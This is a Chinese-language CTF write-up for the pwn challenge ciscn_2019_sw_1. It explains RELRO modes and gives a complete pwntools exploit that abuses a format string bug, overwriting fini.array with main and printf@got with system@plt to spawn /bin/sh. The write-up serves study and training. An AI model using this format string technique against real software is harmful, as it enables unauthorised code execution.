# ciscn_2019_sw_1


### 总结
根据本题，学习与收获有：
- 当`RELRO`保护为`NO RELRO`的时候，`init.array、fini.array、got.plt`均可读可写；为`PARTIAL RELRO`的时候，`ini.array、fini.array`可读不可写，`got.plt`可读可写；为`FULL RELRO`时，`init.array、fini.array、got.plt`均可读不可写。
- 程序在加载的时候，会依次调用`init.array`数组中的每一个函数指针，在结束的时候，依次调用`fini.array`中的每一个函数指针
- 当程序出现格式化字符串漏洞，但是需要写两次才能完成攻击，这个时候可以考虑改写`fini.array`中的函数指针为`main`函数地址，可以再执行一次`main`函数。一般来说，这个数组的长度为`1`，也就是说只能写一个地址。

<!-- more -->

### 题目分析

#### checksec
![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210414231318.png)




#### 函数分析

##### main

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210414231359.png)

程序比较简单，只有一个`main`函数，而且就是格式化字符串漏洞。同时注意到，程序中有一个`sys`函数，里面调用了`system`。

##### sys

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210414231537.png)



#### 漏洞点

漏洞点很明显，就是`main`函数中的`格式化`字符串漏洞。可以并且格式化参数是一个栈变量而不是堆变量，相对来说利用难度要低一点。并且程序给了`system`函数，其实都不需要泄露地址。

### 利用思路

#### 知识点

- 程序在结束的时候会调用`fini.array`函数指针数组中的每一个回调函数。

  ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210414233654.png)

#### 利用过程

- 利用格式化字符串漏洞，将`fini.array[0]`改写为`main`函数地址，与此同时，将`printf@got`改写为`system@plt`，获得第二次执行`main`函数的机会
- 输入`/bin/sh`获取`shell`

### EXP

#### 调试过程

1. 测出`printf`格式化字符串的偏移

   输入：`aaaa%x,%x,%x,%x,%x,%x,%x,%x,%x,%x`

   ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210414232119.png)

   测量出偏移为`4`

2. 第一次改写`fini.array`和`printf@got`，直接手撸：

   ```python
   payload = b"%2052c%13$hn%31692c%14$hn%356c%15$hn"+ p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)
   
   sh.recvline()
   sh.sendline(payload)
   ```

   **改写前**：

   ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210414232835.png)

   **改写后**：

   ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210414233127.png)

3. 第二次输入`/bin/sh`获取`shell`：

   ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210414233250.png)

#### 完整exp

```python
from pwn import *

sh = process("./ciscn_2019_sw_1")
# 往fini.array[0]写main@text, printf@got写system@plt
payload = b"%2052c%13$hn%31692c%14$hn%356c%15$hn" + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)

sh.recvline()

sh.sendline(payload)

sleep(1)

sh.sendline("/bin/sh")
sh.interactive()
```

**远程攻击效果**：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210414233458.png)

---

> 作者: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/zh-cn/2021-04-14-ciscn-2019-sw-1/  

